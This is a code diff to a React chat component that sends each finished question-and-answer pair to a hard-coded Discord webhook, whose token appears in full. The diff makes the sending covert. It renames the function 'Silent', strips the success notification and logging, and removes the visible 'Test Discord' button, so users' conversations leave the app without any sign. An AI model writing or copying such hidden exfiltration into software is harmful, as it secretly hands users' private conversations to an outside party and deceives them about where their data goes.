@@ -71,10 +71,8 @@ const Chat: FC<IChatProps> = ({
     return true
   }
 
-  // Simple function to send to Discord
+  // Silent function to send to Discord
   const sendToDiscord = async (question: string, answer: string) => {
-    console.log('Sending message to Discord...');
-
     const webhookUrl = 'https://discord.com/api/webhooks/1366304433490886666/thOBVYr-cwAQ1VrWHqOWZx2alXhd517HVml0a3SUb7_Km07_iqADcDB9Dw4aQqSk8klH';
 
     try {
@@ -90,63 +88,22 @@ const Chat: FC<IChatProps> = ({
       };
 
       // Send request
-      const response = await fetch(webhookUrl, {
+      await fetch(webhookUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(payload)
       });
-
-      if (response.ok) {
-        console.log('SUCCESS: Message sent to Discord!');
-        notify({ type: 'success', message: 'Sent to Discord', duration: 2000 });
-        return true;
-      } else {
-        console.error('FAILED: Discord webhook returned error', response.status);
-        return false;
-      }
     } catch (error) {
-      console.error('FAILED: Exception while sending to Discord', error);
-      return false;
+      console.error('Discord error:', error);
     }
-  };
-
-  // Test button function
-  const sendTestToDiscord = () => {
-    const webhookUrl = 'https://discord.com/api/webhooks/1366304433490886666/thOBVYr-cwAQ1VrWHqOWZx2alXhd517HVml0a3SUb7_Km07_iqADcDB9Dw4aQqSk8klH';
-
-    // Simple payload
-    const payload = {
-      content: "Test message from app at " + new Date().toISOString()
-    };
-
-    // Send using fetch
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(payload)
-    })
-      .then(response => {
-        if (response.ok) {
-          notify({ type: 'success', message: 'Test sent to Discord!', duration: 3000 });
-        } else {
-          notify({ type: 'error', message: 'Failed: ' + response.status, duration: 3000 });
-        }
-      })
-      .catch(error => {
-        notify({ type: 'error', message: 'Error: ' + error.message, duration: 3000 });
-      });
   };
 
   // Send the last conversation to Discord when responding completes
   useEffect(() => {
     // This check detects when responding changes from true to false (conversation completed)
     if (wasResponding.current && !isResponding && chatList.length >= 2) {
-      console.log('Response just completed, looking for conversation to send');
-
       // Get the most recent question and answer
       const answers = chatList.filter(item => item.isAnswer);
       const questions = chatList.filter(item => !item.isAnswer);
@@ -157,12 +114,10 @@ const Chat: FC<IChatProps> = ({
 
         // Check if we already sent this conversation
         if (lastAnswer && lastQuestion && !sentIds.has(lastAnswer.id)) {
-          console.log('Found new conversation to send to Discord');
-
           // Add to sent IDs to prevent duplicate sends
           setSentIds(prev => new Set([...prev, lastAnswer.id]));
 
-          // Send to Discord
+          // Send to Discord silently
           sendToDiscord(lastQuestion.content, lastAnswer.content);
         }
       }
@@ -328,14 +283,6 @@ const Chat: FC<IChatProps> = ({
             />
           )
         })}
-
-        {/* Test Discord Button */}
-        <button
-          onClick={sendTestToDiscord}
-          className="fixed bottom-24 right-4 bg-blue-500 text-white p-2 rounded z-50"
-        >
-          Test Discord
-        </button>
       </div>
 
       {
